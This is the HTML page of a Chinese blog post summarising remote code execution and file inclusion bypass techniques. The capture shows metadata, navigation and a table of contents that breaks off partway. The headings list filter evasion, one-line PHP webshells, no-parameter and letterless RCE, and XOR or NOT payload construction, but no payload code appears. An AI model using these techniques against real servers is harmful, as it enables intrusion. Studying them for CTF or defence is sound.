<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="什么是RCERCE漏洞，即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。 在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时（当应用程序未正确验证、过滤或限制用户输入时），就产生了RCE漏洞。 分类(远程代码和远程命令)1.命令执">
<meta property="og:type" content="article">
<meta property="og:title" content="对于RCE和文件包含的一点总结">
<meta property="og:url" content="https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="什么是RCERCE漏洞，即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。 在很多Web应用中，开发人员会使用一些特殊函数，这些函数以一些字符串作为输入，功能是将输入的字符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时（当应用程序未正确验证、过滤或限制用户输入时），就产生了RCE漏洞。 分类(远程代码和远程命令)1.命令执">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250307112128383.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250307112322248.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250307112802088.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250416113012028.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250416115831819.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/v2-aa4f8adf4e9a6492247feac2129f62a2_1440w.jpg">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250403184929665.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/a386505b-1c14-48f0-88cb-66923770df33.8732f996cd67.jpg">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250307150508113.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250307151012457.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308102941513.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308103225029.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308103337996.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308104042758.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308111347135.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308111422570.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308113238817.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308115604303.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308143753174.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308143825362.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308145102364.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308145154905.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308152113923.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308154713325.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308154754491.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308155806708.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308160609811.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250308162645101.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20250317164402702.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250306180528089.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250306180648047.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250306182827429.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250306181247298.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250306182241606.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250306191802512.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250306191618115.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250306185618976.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250306184455805.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250314174711424.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/PHP%E5%B0%8F%E5%A6%99%E6%8B%9B/71f52d2105a77d98bb8258abc734614c.png">
<meta property="article:published_time" content="3025-04-16T03:27:31.000Z">
<meta property="article:modified_time" content="2025-09-03T08:05:08.138Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="RCE和文件包含">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/RCE%E7%9A%84bypass/image-20250307112128383.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>对于RCE和文件包含的一点总结</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	

<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/09/09/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jdk7u21%E5%8E%9F%E7%94%9F%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&text=对于RCE和文件包含的一点总结"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&title=对于RCE和文件包含的一点总结"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&is_video=false&description=对于RCE和文件包含的一点总结"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=对于RCE和文件包含的一点总结&body=Check out this article: https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&title=对于RCE和文件包含的一点总结"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&title=对于RCE和文件包含的一点总结"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&title=对于RCE和文件包含的一点总结"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&title=对于RCE和文件包含的一点总结"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&name=对于RCE和文件包含的一点总结&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/&t=对于RCE和文件包含的一点总结"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRCE"><span class="toc-number">1.</span> <span class="toc-text">什么是RCE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E7%B1%BB-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E5%92%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">分类(远程代码和远程命令)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">RCE漏洞产生的条件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E7%BB%95%E8%BF%87bypass%E5%A7%BF%E5%8A%BF"><span class="toc-number">4.</span> <span class="toc-text">RCE绕过bypass姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">php执行系统命令函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">4.2.</span> <span class="toc-text">绕过关键字黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.</span> <span class="toc-text">特殊命令替换绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4cat"><span class="toc-number">4.3.1.</span> <span class="toc-text">读文件命令cat</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">4.4.</span> <span class="toc-text">空格的绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%A7%BF%E5%8A%BF"><span class="toc-number">5.</span> <span class="toc-text">RCE命令执行的姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">5.1.</span> <span class="toc-text">写入一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%AD%E6%A0%87%E7%AD%BE"><span class="toc-number">5.2.</span> <span class="toc-text">短标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">5.3.</span> <span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eeval%E4%B8%AD%E6%9C%89echo%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">5.4.</span> <span class="toc-text">关于eval中有echo的限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E4%B8%AD%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.5.</span> <span class="toc-text">eval中无参数RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">5.5.1.</span> <span class="toc-text">查看当前目录文件名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Alocaleconv-%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.1.1.</span> <span class="toc-text">方法一：localeconv()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Achr-46"><span class="toc-number">5.5.1.2.</span> <span class="toc-text">方法二：chr(46)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9Aphpversion-%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.1.3.</span> <span class="toc-text">方法三：phpversion()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9Acrypt-%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.1.4.</span> <span class="toc-text">方法四：crypt()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.2.</span> <span class="toc-text">读取当前目录文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%95%B0%E7%BB%84%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.2.1.</span> <span class="toc-text">操作数组的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.2.2.</span> <span class="toc-text">读取文件的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#end-%E5%87%BD%E6%95%B0%E8%AF%BB%E5%8F%96%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.2.3.</span> <span class="toc-text">end()函数读取最后一个文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-reverse-%E5%87%BD%E6%95%B0%E7%BF%BB%E8%BD%AC%E6%95%B0%E7%BB%84"><span class="toc-number">5.5.2.4.</span> <span class="toc-text">array_reverse()函数翻转数组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#next-%E5%87%BD%E6%95%B0%E7%A7%BB%E5%8A%A8%E6%8C%87%E9%92%88"><span class="toc-number">5.5.2.5.</span> <span class="toc-text">next()函数移动指针</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E9%9D%9E%E7%AC%AC%E4%B8%80%E7%AC%AC%E4%BA%8C%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.3.</span> <span class="toc-text">读取非第一第二文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">5.5.4.</span> <span class="toc-text">查看上级目录文件名</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9Adirname-%E5%87%BD%E6%95%B0"><span class="toc-number">5.5.4.1.</span> <span class="toc-text">方法一：dirname()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%9E%84%E9%80%A0"><span class="toc-number">5.5.4.2.</span> <span class="toc-text">方法二：构造..</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.5.</span> <span class="toc-text">读取上级目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%92%8C%E8%AF%BB%E5%8F%96%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.6.</span> <span class="toc-text">查看和读取根目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#glob%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="toc-number">5.5.7.</span> <span class="toc-text">glob伪协议查看文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.5.8.</span> <span class="toc-text">利用session进行无参数RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%8F%82%E6%95%B0RE"><span class="toc-number">5.5.9.</span> <span class="toc-text">利用请求头进行无参数RE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.5.10.</span> <span class="toc-text">利用全局变量进行无参数RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#system%E4%B8%AD%E6%97%A0%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">5.6.</span> <span class="toc-text">system中无字母RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-bin%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.6.1.</span> <span class="toc-text">使用&#x2F;bin目录下的可执行程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bashfuck%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">5.6.2.</span> <span class="toc-text">bashfuck实现无字母RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E7%BC%96%E7%A0%81%E6%89%A7%E8%A1%8CRCE"><span class="toc-number">5.6.2.1.</span> <span class="toc-text">数字编码执行RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-Bash-Shell%E7%9A%84Here-string%E8%AF%AD%E6%B3%95"><span class="toc-number">5.6.2.2.</span> <span class="toc-text">Linux Bash Shell的Here string语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0%E5%8F%98%E9%87%8F"><span class="toc-number">5.6.2.3.</span> <span class="toc-text">$0变量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-0"><span class="toc-number">5.6.2.4.</span> <span class="toc-text">构造$0</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E4%B8%AD%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE-%E5%9F%BA%E7%A1%80"><span class="toc-number">5.7.</span> <span class="toc-text">eval中无数字字母RCE(基础)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E%E6%9E%84%E9%80%A0"><span class="toc-number">5.7.1.</span> <span class="toc-text">自增构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E6%9E%84%E9%80%A0"><span class="toc-number">5.7.2.</span> <span class="toc-text">异或构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D%E6%9E%84%E9%80%A0"><span class="toc-number">5.7.3.</span> <span class="toc-text">取反构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%96%E6%9E%84%E9%80%A0"><span class="toc-number">5.7.4.</span> <span class="toc-text">或构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E4%B8%AD%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE-%E5%86%B2%E7%A0%B4%E9%99%90%E5%88%B6"><span class="toc-number">5.8.</span> <span class="toc-text">eval中无数字字母RCE(冲破限制)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-5-%E5%92%8C-PHP-7-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">5.8.1.</span> <span class="toc-text">PHP 5 和 PHP 7 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5-shell%E6%89%93%E7%A0%B4%E9%99%90%E5%88%B6"><span class="toc-number">5.8.2.</span> <span class="toc-text">PHP5+shell打破限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3glob%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">5.8.3.</span> <span class="toc-text">深入理解glob通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0poc%E6%89%A7%E8%A1%8Crce"><span class="toc-number">5.8.4.</span> <span class="toc-text">构造poc执行rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval%E4%B8%AD%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE-%E6%89%A9%E5%B1%95"><span class="toc-number">5.9.</span> <span class="toc-text">eval中无数字字母RCE(扩展)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8linux%E7%9A%84-%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97"><span class="toc-number">5.9.0.1.</span> <span class="toc-text">利用linux的$(())构造数字</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-number">5.10.</span> <span class="toc-text">环境变量绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PATH%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%88%87%E5%89%B2%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6"><span class="toc-number">5.10.1.</span> <span class="toc-text">$PATH环境变量切割构造字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWD%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%88%87%E5%89%B2%E6%9E%84%E9%80%A0%E5%AD%97%E7%AC%A6"><span class="toc-number">5.10.2.</span> <span class="toc-text">$PWD环境变量切割构造字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-number">5.10.3.</span> <span 